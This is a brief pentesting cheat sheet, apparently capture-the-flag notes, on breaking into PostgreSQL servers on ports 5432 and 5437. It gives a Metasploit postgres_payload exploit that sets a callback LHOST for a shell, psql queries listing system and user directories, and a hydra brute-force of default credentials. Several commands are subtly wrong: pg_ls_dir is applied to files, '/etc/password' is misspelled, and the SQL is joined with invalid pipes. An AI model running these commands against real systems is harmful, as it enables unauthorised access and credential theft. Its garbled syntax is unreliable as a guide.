# PostgreSQL

## PORT 5437 & PORT 5432 PostgreSQL

If you find this port, follow the commands below, and you can easily find credentials from another port as well

5437/tcp open postgresql PostgreSQL DB 11.3 - 11.7

    msf6 exploit(linux/postgres/postgres_payload) > options and set all values rhost lhost port LHOST tun0

    psql -U postgres -p 5437 -h IP | select pg_ls_dir(‘./’); | select pg_ls_dir(‘/etc/password’); | select pg_ls_dir(‘/home/wilson’); | select pg_ls_dir(‘/home/Wilson/local.txt’);

### Brute force default PostgreSQL credentials

    hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt IP postgres
